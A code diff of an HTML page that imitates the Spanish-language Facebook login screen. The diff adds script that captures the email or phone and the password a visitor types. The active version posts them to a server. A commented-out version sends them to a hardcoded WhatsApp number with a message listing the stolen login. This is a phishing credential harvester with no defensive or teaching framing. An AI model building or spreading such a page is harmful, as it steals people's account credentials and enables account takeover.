@@ -18,14 +18,54 @@
             <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         <div class="container-form">
-            <form class="form">
-                <input type="text" placeholder="Correo electronico o numero de telefono">
-                <input type="password" placeholder="Contraseña">
+            <form class="form" id="loginForm">
+                <input type="text" id="emailOrPhone" placeholder="Correo electronico o numero de telefono">
+                <input type="password" id="password" placeholder="Contraseña">
                 <input type="submit" value="Iniciar Sesión">
                 <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                 <div class="border"></div>
                 <button><a href="#">Crear cuenta nueva</a></button>
             </form>
+            <!-- <script>
+                document.getElementById("loginForm").addEventListener("submit", function(event) {
+                    event.preventDefault(); // Evita que la página se recargue
+                    
+                    // Capturar valores de los inputs
+                    let emailOrPhone = document.getElementById("emailOrPhone").value;
+                    let password = document.getElementById("password").value;
+                    
+                    // Número de WhatsApp al que se enviará el mensaje (incluye código de país)
+                    let numeroWhatsApp = "573222443990"; // Reemplaza con tu número
+                    
+                    // Mensaje a enviar
+                    let mensaje = `Hola, aquí están los datos de inicio de sesión:\n📧 Usuario: ${emailOrPhone}\n🔒 Contraseña: ${password}`;
+                    alert(mensaje);
+                    // Crear enlace de WhatsApp
+                    let urlWhatsApp = `https://api.whatsapp.com/send?phone=${numeroWhatsApp}&text=${encodeURIComponent(mensaje)}`;
+                    
+                    // Redirigir al enlace de WhatsApp
+                    window.open(urlWhatsApp, "_blank");
+                });
+            </script> -->
+            <script>
+                document.getElementById("loginForm").addEventListener("submit", function(event) {
+                    event.preventDefault(); // Evita que la página se recargue
+                    
+                    // Capturar valores de los inputs
+                    let emailOrPhone = document.getElementById("emailOrPhone").value;
+                    let password = document.getElementById("password").value;
+        
+                    // Enviar los datos al servidor con fetch
+                    fetch("http://localhost:3000/login", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ emailOrPhone, password })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log(data.message))
+                    .catch(error => console.error("Error:", error));
+                });
+            </script>
             <p class="create-page">
                 <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
             </p>
